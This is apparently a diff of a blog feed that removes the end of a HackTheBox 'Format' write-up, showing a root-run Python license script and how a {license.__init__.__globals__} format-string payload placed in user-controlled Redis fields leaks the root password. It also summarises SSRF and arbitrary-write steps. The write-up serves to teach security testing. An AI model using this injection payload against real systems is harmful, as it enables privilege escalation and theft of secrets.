-<span class="kn">import</span> <span class="nn">redis</span>
-<span class="kn">import</span> <span class="nn">argparse</span>
-<span class="kn">import</span> <span class="nn">os</span>
-<span class="kn">import</span> <span class="nn">sys</span>
-
-<span class="k">class</span> <span class="nc">License</span><span class="p">():</span>
-    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
-        <span class="n">chars</span> <span class="o">=</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">digits</span> <span class="o">+</span> <span class="n">string</span><span class="p">.</span><span class="n">punctuation</span>
-        <span class="bp">self</span><span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">40</span><span class="p">))</span>
-        <span class="bp">self</span><span class="p">.</span><span class="n">created</span> <span class="o">=</span> <span class="n">date</span><span class="p">.</span><span class="n">today</span><span class="p">()</span>
-
-<span class="k">if</span> <span class="n">os</span><span class="p">.</span><span class="n">geteuid</span><span class="p">()</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">:</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"Microblog license key manager can only be run as root"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
-
-<span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="p">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s">'Microblog license key manager'</span><span class="p">)</span>
-<span class="n">group</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">add_mutually_exclusive_group</span><span class="p">(</span><span class="n">required</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
-<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-p'</span><span class="p">,</span> <span class="s">'--provision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Provision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
-<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-d'</span><span class="p">,</span> <span class="s">'--deprovision'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Deprovision license key for specified user'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'username'</span><span class="p">)</span>
-<span class="n">group</span><span class="p">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s">'-c'</span><span class="p">,</span> <span class="s">'--check'</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s">'Check if specified license key is valid'</span><span class="p">,</span> <span class="n">metavar</span><span class="o">=</span><span class="s">'license_key'</span><span class="p">)</span>
-<span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="p">.</span><span class="n">parse_args</span><span class="p">()</span>
-
-<span class="n">r</span> <span class="o">=</span> <span class="n">redis</span><span class="p">.</span><span class="n">Redis</span><span class="p">(</span><span class="n">unix_socket_path</span><span class="o">=</span><span class="s">'/var/run/redis/redis.sock'</span><span class="p">)</span>
-
-<span class="n">secret</span> <span class="o">=</span> <span class="p">[</span><span class="n">line</span><span class="p">.</span><span class="n">strip</span><span class="p">()</span> <span class="k">for</span> <span class="n">line</span> <span class="ow">in</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/secret"</span><span class="p">)][</span><span class="mi">0</span><span class="p">]</span>
-<span class="n">secret_encoded</span> <span class="o">=</span> <span class="n">secret</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
-<span class="n">salt</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'microblogsalt123'</span>
-<span class="n">kdf</span> <span class="o">=</span> <span class="n">PBKDF2HMAC</span><span class="p">(</span><span class="n">algorithm</span><span class="o">=</span><span class="n">hashes</span><span class="p">.</span><span class="n">SHA256</span><span class="p">(),</span><span class="n">length</span><span class="o">=</span><span class="mi">32</span><span class="p">,</span><span class="n">salt</span><span class="o">=</span><span class="n">salt</span><span class="p">,</span><span class="n">iterations</span><span class="o">=</span><span class="mi">100000</span><span class="p">,</span><span class="n">backend</span><span class="o">=</span><span class="n">default_backend</span><span class="p">())</span>
-<span class="n">encryption_key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">urlsafe_b64encode</span><span class="p">(</span><span class="n">kdf</span><span class="p">.</span><span class="n">derive</span><span class="p">(</span><span class="n">secret_encoded</span><span class="p">))</span>
-
-<span class="n">f</span> <span class="o">=</span> <span class="n">Fernet</span><span class="p">(</span><span class="n">encryption_key</span><span class="p">)</span>
-<span class="n">l</span> <span class="o">=</span> <span class="n">License</span><span class="p">()</span>
-
-<span class="c1">#provision
-</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
-    <span class="n">user_profile</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hgetall</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">)</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">user_profile</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"User does not exist. Please provide valid username."</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-        <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
-    <span class="n">existing_keys</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/keys"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">)</span>
-    <span class="n">all_keys</span> <span class="o">=</span> <span class="n">existing_keys</span><span class="p">.</span><span class="n">readlines</span><span class="p">()</span>
-    <span class="k">for</span> <span class="n">user_key</span> <span class="ow">in</span> <span class="n">all_keys</span><span class="p">:</span>
-        <span class="k">if</span><span class="p">(</span><span class="n">user_key</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">":"</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">):</span>
-            <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-            <span class="k">print</span><span class="p">(</span><span class="s">"License key has already been provisioned for this user"</span><span class="p">)</span>
-            <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-            <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
-    <span class="n">prefix</span> <span class="o">=</span> <span class="s">"microblog"</span>
-    <span class="n">username</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"username"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
-    <span class="n">firstlast</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"first-name"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="n">r</span><span class="p">.</span><span class="n">hget</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span><span class="p">,</span> <span class="s">"last-name"</span><span class="p">).</span><span class="n">decode</span><span class="p">()</span>
-    <span class="n">license_key</span> <span class="o">=</span> <span class="p">(</span><span class="n">prefix</span> <span class="o">+</span> <span class="n">username</span> <span class="o">+</span> <span class="s">"{license.license}"</span> <span class="o">+</span> <span class="n">firstlast</span><span class="p">).</span><span class="nb">format</span><span class="p">(</span><span class="n">license</span><span class="o">=</span><span class="n">l</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"Plaintext license key:"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">license_key</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-    <span class="n">license_key_encoded</span> <span class="o">=</span> <span class="n">license_key</span><span class="p">.</span><span class="n">encode</span><span class="p">()</span>
-    <span class="n">license_key_encrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">license_key_encoded</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"Encrypted license key (distribute to customer):"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="n">license_key_encrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"/root/license/keys"</span><span class="p">,</span> <span class="s">"a"</span><span class="p">)</span> <span class="k">as</span> <span class="n">license_keys_file</span><span class="p">:</span>
-        <span class="n">license_keys_file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">provision</span> <span class="o">+</span> <span class="s">":"</span> <span class="o">+</span> <span class="n">license_key_encrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">()</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
-
-<span class="c1">#deprovision
-</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">deprovision</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">"License key deprovisioning coming soon"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">()</span>
-
-<span class="c1">#check
-</span><span class="k">if</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">):</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-    <span class="k">try</span><span class="p">:</span>
-        <span class="n">license_key_decrypted</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">check</span><span class="p">.</span><span class="n">encode</span><span class="p">())</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"License key valid! Decrypted value:"</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"------------------------------------------------------"</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">license_key_decrypted</span><span class="p">.</span><span class="n">decode</span><span class="p">())</span>
-    <span class="k">except</span><span class="p">:</span>
-        <span class="k">print</span><span class="p">(</span><span class="s">"License key invalid"</span><span class="p">)</span>
-    <span class="k">print</span><span class="p">(</span><span class="s">""</span><span class="p">)</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>Taking a close look at the script, it seems to be loading some secret from <code class="language-plaintext highlighter-rouge">/root/license/secret</code> into the variable <code class="language-plaintext highlighter-rouge">secret</code>. It then connects to the redis database and query users depending on the arguments that were passed.</p>
-
-<p>When given the <code class="language-plaintext highlighter-rouge">-p</code> flag followed by a username, the script process it as follows;</p>
-<ol>
-  <li>Checks to see if the username exist in the redis database. If not, it exit.</li>
-  <li>Checks to see if the username is in <code class="language-plaintext highlighter-rouge">/root/license/keys</code>, which seems to be used to store username and license key. If it is, it exits.</li>
-  <li>Uses the user’s <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">first-name</code>, and <code class="language-plaintext highlighter-rouge">last-name</code> in a call to <code class="language-plaintext highlighter-rouge">format()</code> to build a string that is later printed.</li>
-</ol>
-
-<p>This last point is very interesting because both <code class="language-plaintext highlighter-rouge">username</code>, <code class="language-plaintext highlighter-rouge">first-name</code>, and <code class="language-plaintext highlighter-rouge">last-name</code> are values we control, and passing untrusted data to <code class="language-plaintext highlighter-rouge">format()</code> can cause bad things as we could be able to leak data into the string;</p>
-
-<p><img src="/assets/img/Pasted image 20230901222823.png" alt="" /></p>
-
-<p>The only object we will have access to in the context of <code class="language-plaintext highlighter-rouge">format()</code> is <code class="language-plaintext highlighter-rouge">license</code>, which is an instance of the <code class="language-plaintext highlighter-rouge">License</code> class, and doesn’t really have anything interesting. However, all class objects in python has the attribute <code class="language-plaintext highlighter-rouge">__init__.__globals__</code>, which is a dictionary containing key-value mappings of all global objects in it’s scope;</p>
-
-<p><img src="/assets/img/Pasted image 20230901222652.png" alt="" /></p>
-
-<p>Since our <code class="language-plaintext highlighter-rouge">secret</code> variable was defined globally outside of any function, we could leak it by setting any of the values we control that are used in the <code class="language-plaintext highlighter-rouge">format()</code> call to <code class="language-plaintext highlighter-rouge">{license.__init__.__globals__}</code>;</p>
-
-<p><img src="/assets/img/Pasted image 20230901224246.png" alt="" /></p>
-
-<p>This leaked the secret successfully;</p>
-
-<p><img src="/assets/img/Pasted image 20230901224358.png" alt="" /></p>
-
-<p>Using that as a password, I was able to login as <code class="language-plaintext highlighter-rouge">root</code>;</p>
-
-<p><img src="/assets/img/Pasted image 20230901224453.png" alt="" /></p>
-
-<hr />
-
-<p><br /></p>
-
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>NMAP discovered port <strong>22</strong> (SSH), <strong>80</strong> (Nginx), and <strong>3000</strong> (Gitea)</li>
-  <li>Gitea instance has a public repo with containing the full source of the web app</li>
-  <li>Exploited an SSRF to query backend redis, and elevate to <strong>pro</strong> user
-    <ul>
-      <li>Exploited an arbitrary write vulnerability to gain a shell as <code class="language-plaintext highlighter-rouge">www-data</code></li>
-    </ul>
-  </li>
-  <li>Inside the box as <code class="language-plaintext highlighter-rouge">www-data</code>;
-    <ul>
-      <li>Found creds for a local user  <code class="language-plaintext highlighter-rouge">cooper</code> in the redis database</li>
-    </ul>
-  </li>
-  <li>Inside the box as <code class="language-plaintext highlighter-rouge">cooper</code>;
-    <ul>
-      <li>Exploited a call to <code class="language-plaintext highlighter-rouge">format()</code> with user-controlled value in a custom sudo script to leak root password.</li>
-    </ul>
-  </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="medium" /><category term="web" /><category term="gitea" /><category term="php" /><category term="redis" /><category term="arbitrary write" /><category term="lfi" /><category term="nginx" /><category term="proxy_pass" /><category term="python format string exploit" /><summary type="html"><![CDATA[Format is a nice medium linux machine on HackTheBox. It features a custom web application for creating blogs that is vulnerable to arbitrary read and write, which is easy to detect as the full application source code is accessible in a public Gitea repo. Once inside, you’ll be recovering some creds from the backend redis server, and exploiting a format string vulnerability in a python program to gain root.]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hacthebox" /><category term="medium" /><category term="linux" /><category term="web" /><category term="zip" /><category term="file upload" /><category term="zip slip" /><category term="dlopen" /><summary type="html"><![CDATA[Zipping is a nice medium linux box on HackTheBox. It starts with exploiting a descrepancy on how gz (CLI) and ZipArchive (PHP) works to fool the web app into extracting a ZIP file containing a PHP file thinking it’s a PDF. This approach turns out to be unintended, but I liked it more. Privesc to root is through dynamic import hijack with dlopen().]]></summary></entry></feed>
